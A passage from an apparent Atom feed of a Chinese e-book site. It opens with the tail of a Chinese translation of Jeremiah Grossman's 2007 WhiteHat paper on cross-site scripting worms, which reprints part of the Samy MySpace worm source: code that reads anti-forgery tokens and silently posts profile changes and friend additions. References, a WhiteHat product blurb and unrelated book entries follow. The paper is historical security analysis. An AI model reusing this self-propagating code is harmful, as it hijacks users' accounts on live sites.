&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AU = J.responseText;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AG = findIn(AU, &amp;apos;P&amp;apos; + &amp;apos;rofileHeroes&amp;apos;, &amp;apos; &amp;lt; /td&amp;gt;&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AG = AG.substring(61, AG.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (AG.indexOf(&amp;apos;samy&amp;apos;) == -1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        if (AF) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            AG += AF;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            var AR = getFromURL(AU, &amp;apos;Mytoken&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            var AS = new Ar - ray();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            AS[&amp;apos;interestLabel&amp;apos;] = &amp;apos;heroes&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            AS[&amp;apos;submit&amp;apos;] = &amp;apos;Preview&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            AS[&amp;apos;interest&amp;apos;] = AG;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            J = getXMLObj();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            httpSend(&amp;apos;/index.cfm ? fuseaction = profile.previewInterests &amp;amp; Mytoken = &amp;apos; + AR,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                postHero, &amp;apos;POST&amp;apos;, paramsToString(AS))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function postHero() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (J.readyState != 4) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AU = J.responseText;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AR = getFromURL(AU, &amp;apos;Mytoken&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AS = new Ar - ray();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AS[&amp;apos;interestLabel&amp;apos;] = &amp;apos;heroes&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AS[&amp;apos;submit&amp;apos;] = &amp;apos;Submit&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AS[&amp;apos;interest&amp;apos;] = AG;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AS[&amp;apos;hash&amp;apos;] = getHiddenParame - ter(AU, &amp;apos;hash&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    httpSend(&amp;apos; / index.cfm ? fuseaction = profile.processInterests &amp;amp; Mytoken = &amp;apos; + AR,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        nothing, &amp;apos;POST&amp;apos;, paramsToString(AS))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function main() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AN = getClientFID();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var BH = &amp;apos; / index.cfm ? fuseaction = user.viewProfile &amp;amp; friendID = &amp;apos; + AN + &amp;apos; &amp;amp; Mytoken = &amp;apos; + L;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    J = getXMLObj();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    httpSend(BH, getHome, &amp;apos;GET&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    xmlhttp2 = getXMLObj();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    httpSend2(&amp;apos; / index.cfm ? fuseaction = invite.addfriend_verify &amp;amp; friendID = 11851658 &amp;amp; Mytoken = &amp;apos; + L,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        processxForm, &amp;apos;GET&amp;apos;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function processx - Form() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (xmlhttp2.readyState != 4) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AU = xmlhttp2.responseText;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AQ = getHiddenParameter(AU, &amp;apos;hashcode&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AR = getFromURL(AU, &amp;apos;Mytoken&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    var AS = new Array();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AS[&amp;apos;hashcode&amp;apos;] = AQ;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AS[&amp;apos;friendID&amp;apos;] = &amp;apos;11851658&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    AS[&amp;apos;submit&amp;apos;] = &amp;apos;Add to Friends&amp;apos;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    httpSend2(&amp;apos; / index.cfm ? fuseaction = invite.addFriendsProcess &amp;amp; Mytoken = &amp;apos; + AR,&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        nothing, &amp;apos;POST&amp;apos;, paramsToString(AS))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;function httpSend2(BH, BI, BJ, BK) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (!xmlhttp2) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        return false&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    eval(&amp;apos;xmlhttp2.onr&amp;apos; + &amp;apos;eadystatechange = BI&amp;apos;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    xmlhttp2.open(BJ, BH, true);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    if (BJ == &amp;apos;POST&amp;apos;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        xmlhttp2.setRequestHeader(&amp;apos;Content - Type&amp;apos;, &amp;apos;application / x - www - form - urlencoded&amp;apos;); xmlhttp2.setRequestHeader(&amp;apos;Content - Length&amp;apos;, BK.length)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    xmlhttp2.send(BK); return true&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;”&amp;gt;&amp;lt;/DIV&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;Notes&quot;&gt;&lt;a href=&quot;#Notes&quot; class=&quot;headerlink&quot; title=&quot;Notes&quot;&gt;&lt;/a&gt;Notes&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;The Samy Worm “I’ll never get caught. I’m Popular.” – &lt;a href=&quot;http://namb.la/popular/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://namb.la/popular/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Cross-site Scripting (Web Security Threat Classification) – &lt;a href=&quot;http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.webappsec.org/projects/threat/classes/cross-&lt;/a&gt; &lt;a href=&quot;http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;&lt;/a&gt; &lt;a href=&quot;http://www.webappsec.org/projects/threat/classes/cross-site_scripting.shtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;site_scripting.shtml&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Teen uses worm to boost ratings on MySpace.com, Computerworld, October 17, 2005 – &lt;a href=&quot;http://www.computerworld.com/securitytopics/security/holes/story/0%2C10801%2C105484%2C00.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.computerworld.com/securitytopics/security/holes/story/0,10801,105484,00.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Do Online Banks Facilitate Fraud?, TheMotleyFool.com, December 8, 2004 – &lt;a href=&quot;http://www.fool.com/News/mft/2004/mft04120810.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.fool.com/News/mft/2004/mft04120810.htm&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Phishing with Superbait, Silicon Valley Chapter (San Jose), April, 2005 – &lt;a href=&quot;http://www.whitehatsec.com/presentations/phishing_superbait.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.whitehatsec.com/presentations/phishing_superbait.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Content Restrictions – &lt;a href=&quot;http://www.gerv.net/security/content-restrictions/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.gerv.net/security/content-restrictions/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;A phishing wolf in sheep’s clothing, ZDNet, March 14, 2005 – &lt;a href=&quot;http://news.zdnet.com/2100-1009_22-5616419.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://news.zdnet.com/2100-1009_22-5616419.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The Cross Site Scripting FAQ – &lt;a href=&quot;http://www.cgisecurity.com/articles/xss-faq.shtml&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cgisecurity.com/articles/xss-faq.shtml&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;XSS cheat sheet – &lt;a href=&quot;http://ha.ckers.org/xss.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://ha.ckers.org/xss.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Ajax: A New Approach to Web Applications, Jesse James Garrett, February 18, 2005 – &lt;a href=&quot;http://www.adaptivepath.com/publications/essays/archives/000385.php&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.adaptivepath.com/publications/essays/archives/000385.php&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;XMLHttpRequest, XUL Planet – &lt;a href=&quot;http://www.xulplanet.com/references/objref/XMLHttpRequest.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.xulplanet.com/references/objref/XMLHttpRequest.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Cross-Site Scripting Worm Hits MySpace, BetaNews, October 13, 2005 – &lt;a href=&quot;http://www.betanews.com/article/CrossSite_Scripting_Worm_Hits_MySpace/1129232391&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.betanews.com/article/CrossSite_Scripting_Worm_Hits_MySpace/1129232391&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Samy’s cancelled MySpace profile – &lt;a href=&quot;http://www.myspace.com/33934660&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.myspace.com/33934660&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Technical explanation of the MySpace worm – &lt;a href=&quot;http://namb.la/popular/tech.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://namb.la/popular/tech.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;.CAIDA Analysis of Code-Red – &lt;a href=&quot;http://www.caida.org/analysis/security/code-red/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.caida.org/analysis/security/code-red/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;.Code-Red: a case study on the spread and victims of an Internet worm – &lt;a href=&quot;http://www.caida.org/outreach/papers/2002/codered/codered.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.caida.org/outreach/papers/2002/codered/codered.pdf&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;.SQL slammer (computer worm) – &lt;a href=&quot;http://en.wikipedia.org/wiki/SQLSlammer&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://en.wikipedia.org/wiki/SQLSlammer&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The Spread of the Sapphire/Slammer Worm – &lt;a href=&quot;http://www.cs.berkeley.edu/%7Enweaver/sapphire/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cs.berkeley.edu/~nweaver/sapphire/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Slammed!, Wired, July 2003 – &lt;a href=&quot;http://www.wired.com/wired/archive/11.07/slammer.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.wired.com/wired/archive/11.07/slammer.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Viruses and Worms: What Can We Do About Them?, Testimony of Richard D. Pethia, September 10, 2003 – &lt;a href=&quot;http://www.cert.org/congressional_testimony/Pethia-Testimony-9-10-2003/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cert.org/congressional_testimony/Pethia-Testimony-9-10-2003/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Yahoo Attack Exposes Web Weakness, BBC News, February 9, 2000 – &lt;a href=&quot;http://news.bbc.co.uk/1/hi/sci/tech/635444.stm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://news.bbc.co.uk/1/hi/sci/tech/635444.stm&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Post to BugTraq by Elias Levy, February 11, 200 – &lt;a href=&quot;http://www.sdnp.undp.org/rc/forums/tech/sdnptech/msg02563.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.sdnp.undp.org/rc/forums/tech/sdnptech/msg02563.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Xanga Hit By Script Worm – &lt;a href=&quot;http://blogs.securiteam.com/index.php/archives/166&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blogs.securiteam.com/index.php/archives/166&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Account Hijackings Force LiveJournal Changes – &lt;a href=&quot;http://blogs.washingtonpost.com/securityfix/2006/01/account_hijacki.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blogs.washingtonpost.com/securityfix/2006/01/account_hijacki.html&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;NoScript Firefox extension – &lt;a href=&quot;https://addons.mozilla.org/extensions/moreinfo.php?id=722&amp;amp;application=firefox&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://addons.mozilla.org/extensions/moreinfo.php?id=722&amp;amp;application=firefox&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Netcraft Toolbar – &lt;a href=&quot;http://toolbar.netcraft.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://toolbar.netcraft.com/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Security Corner: Cross-Site Request Forgeries December, 2004 – &lt;a href=&quot;http://shiflett.org/articles/security-corner-dec2004&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://shiflett.org/articles/security-corner-dec2004&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;The CAPTCHA Project, Telling Humans and Computers Apart – &lt;a href=&quot;http://www.captcha.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.captcha.net/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Mitigating Cross-site Scripting With HTTP-only Cookies – &lt;a href=&quot;http://msdn.microsoft.com/workshop/author/dhtml/httponly_cookies.asp&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://msdn.microsoft.com/workshop/author/dhtml/httponly_cookies.asp&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Web Security Threat Classification – &lt;a href=&quot;http://www.webappsec.org/projects/threat/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.webappsec.org/projects/threat/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Web Application Firewall Evaluation Criteria (WAFEC) – &lt;a href=&quot;http://www.webappsec.org/projects/wafec/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.webappsec.org/projects/wafec/&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;WhiteHat 的 Sentinel 服务 - 完整的网站漏洞管理&lt;/p&gt;
&lt;p&gt;寻找漏洞，保护您的网站 – WhiteHat Sentinel 服务是一个独特的组合，专家分析和专有的自动扫描技术，提供最 全面的网站漏洞覆盖。担心 OWASP 十大安全漏洞或 WASC 威胁分类？扫描器无法识别这些标准所定义的所有的漏洞。 WhiteHat Sentinel 可以。许多最危险的漏洞存在于应用程序的业务逻辑，仅能通过专家的人工分析发现。&lt;/p&gt;
&lt;p&gt;不断改进和完善 – WhiteHat Sentinel 在通过持续更新和优化服务保持网站的攻击媒介的最新，并在这方面保持领先 一步。更新是连续的 - 经常一天到几个星期，相对于最多六个月或更长的传统的软件工具。而且，Sentinel 使用其独 特的“Inspector”技术评估确认每一个网站的漏洞。最终，每个站点的利益来自他人的保护。&lt;/p&gt;
&lt;p&gt;从根本上消除误报 – 非忙碌的安全团队有时间来处理误报。这就是为什么 WhiteHat Sentinel 安全运营团队通过所 有检测的检验。客户只会看到实际的，可操作的漏洞，节省时间和金钱。&lt;/p&gt;
&lt;p&gt;总控制 – WhiteHat Sentinel 通过客户的设置来运行，而不是我们。扫描可手动或自动运行于每天，每周，不过往往 运行于网站变化的时候。在需要的时候，WhiteHat Sentinel 提供了一个全面的评估，加上威胁和严重程度级别基础上 的优先级建议，所需要的知识，以确保提供给他们的安全专业人士更好的帮助。&lt;/p&gt;
&lt;p&gt;网站任何时刻的更新，无限制的评估 – 使用 WhiteHat Sentinel，客户支付年费，每年可以进行无限制的评估。 而且，可以通过 WhiteHat Sentinel 管理更多的应用，相对每个应用更低的费用。高容量电子商务网站可能有每周一次 的代码更改，而其他则每月更改一次。WhiteHat Sentinel 提供频繁必要的评估网站的灵活性。&lt;/p&gt;
&lt;p&gt;简单的管理 – 没有繁琐的软件安装和配置。最初的漏洞评估往往是在一小时内就运行。使用 WhiteHat Sentinel 的 Web 界面，可以很容易地访问漏洞数据，可以安排在任何时间从任何位置扫描或打印报告。不需要为软件、硬件、一 个工程师来运行扫描和解释报告支付费用。使用 WhiteHat Sentinel 服务，简化了网站漏洞管理和控制。&lt;/p&gt;
&lt;h1 id=&quot;关于&quot;&gt;&lt;a href=&quot;#关于&quot; class=&quot;headerlink&quot; title=&quot;关于&quot;&gt;&lt;/a&gt;关于&lt;/h1&gt;&lt;p&gt;关于作者&lt;/p&gt;
&lt;p&gt;Jeremiah Grossman 是 WhiteHat Security 的创始人和 CTO，在漏洞管理方面是世界知名专家，Web 应用安全联盟的创始人之一，最近被评为 InfoWorld 的 2007 年 25 位首席技术官。格罗斯曼先生是一个经常在行业会议发表演讲的 人，包括黑帽子大会，ISACA，CSI，OWASP，Vanguard，ISSA，OWASP，Defcon 黑客大会等。他撰写了大量的文章和白皮书，发现了许多尖端的攻击和防御技术，是《XSS Exploits》的合作作者。格罗斯曼先生经常在各大媒体出版物发表 文章，如 InfoWorld，USA Today，PCWorld，Dark Reading，SC Magazine，SecurityFocus，C-Net，SC Magazine，CSO 以 及 InformationWeek。在 WhiteHat Security 之前，他是雅虎的一个信息安全人员。&lt;/p&gt;
&lt;p&gt;关于 WhiteHat Security 公司&lt;/p&gt;
&lt;p&gt;WhiteHat Security 的总部设在加利福尼亚州的圣克拉拉，是网站漏洞管理服务的领先供应商。WhiteHat 的 delivers turnkey 解决方案，使企业能够获得宝贵的客户数据，符合行业标准，并保持品牌的完整性。WhiteHat Sentinel，公司 的旗舰服务，是结合专家的分析和行业领先的技术，提供无与伦比的覆盖面，以保护关键数据免受攻击的唯一的解决 方案。WhiteHat Security 的更多信息，请访问 &lt;a href=&quot;http://www.whitehatsec.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;www.whitehatsec.com&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;WhiteHat Security, Inc. | 3003 Bunker Hill Lane, Suite 220 | Santa Clara, CA 95054 | 408.343.8300 |&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.whitehatsec.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;www.whitehatsec.com&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;版权所有 © 2007 WhiteHat Security 公司 | 本出版物中使用的产品名称或品牌仅用于识别目的，可能是 其各自公司的商标或品牌。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;June 2007 – updated Jeremiah Grossman&lt;/p&gt;
&lt;p&gt;Founder and CTO, WhiteHat Security&lt;/p&gt;
&lt;p&gt;翻译：&lt;a href=&quot;http://hi.baidu.com/fooying&quot;&gt;Fooying&lt;/a&gt;（知道创宇安全研究团队）&lt;/p&gt;
&lt;p&gt;2013/1/1&lt;/p&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://it-ebooks.flygon.net/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>用Python做科学计算</title>
    <link href="http://it-ebooks.flygon.net/scipy-doc/"/>
    <id>http://it-ebooks.flygon.net/scipy-doc/</id>
    <published>2016-03-12T05:34:19.000Z</published>
    <updated>2016-03-12T05:35:54.409Z</updated>
    
    <content type="html">&lt;p&gt;作者：&lt;a href=&quot;http://hyry.dip.jp/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;HYRY Studio&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://old.sebug.net/paper/books/scipydoc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;p&gt;暂无。&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;作者：&lt;a href=&quot;http://hyry.dip.jp/&quot;&gt;HYRY Studio&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://it-ebooks.flygon.net/tags/python/"/>
    
      <category term="numpy" scheme="http://it-ebooks.flygon.net/tags/numpy/"/>
    
      <category term="scipy" scheme="http://it-ebooks.flygon.net/tags/scipy/"/>
    
      <category term="科学计算" scheme="http://it-ebooks.flygon.net/tags/%E7%A7%91%E5%AD%A6%E8%AE%A1%E7%AE%97/"/>
    
  </entry>
  
  <entry>
    <title>iOS Security May 2012</title>
    <link href="http://it-ebooks.flygon.net/ios-sec-may-2012/"/>
    <id>http://it-ebooks.flygon.net/ios-sec-may-2012/</id>
    <published>2016-03-12T05:29:52.000Z</published>
    <updated>2016-03-12T05:30:36.697Z</updated>
    
    <content type="html">&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;p&gt;暂无。&lt;/p&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://old.sebug.net/paper/mobile/iOS_Security_May12.pdf&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;PDF格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;p&gt;暂无。&lt;/p&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载
    
    </summary>
    
    
      <category term="ios" scheme="http://it-ebooks.flygon.net/tags/ios/"/>
    
      <category term="逆向" scheme="http://it-ebooks.flygon.net/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>iOS Security Wiki</title>
    <link href="http://it-ebooks.flygon.net/ios-sec-wiki/"/>
    <id>http://it-ebooks.flygon.net/ios-sec-wiki/</id>
    <published>2016-03-12T05:23:07.000Z</published>
    <updated>2016-03-12T05:24:26.829Z</updated>
    
    <content type="html">&lt;p&gt;&lt;img src=&quot;&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;作者：&lt;a href=&quot;https://github.com/wufawei&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;wufawei&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;来源：&lt;a href=&quot;https://github.com/wufawei/iossecurity&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;iossecurity&lt;/a&gt;&lt;/p&gt;
&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;在线阅读&quot;&gt;&lt;a href=&quot;#在线阅读&quot; class=&quot;headerlink&quot; title=&quot;在线阅读&quot;&gt;&lt;/a&gt;在线阅读&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://security.ios-wiki.com/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;在线阅读&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;下载&quot;&gt;&lt;a href=&quot;#下载&quot; class=&quot;headerlink&quot; title=&quot;下载&quot;&gt;&lt;/a&gt;下载&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/wufawei/iossecurity/archive/master.zip&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Markdown格式&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</content>
    
    <summary type="html">
    
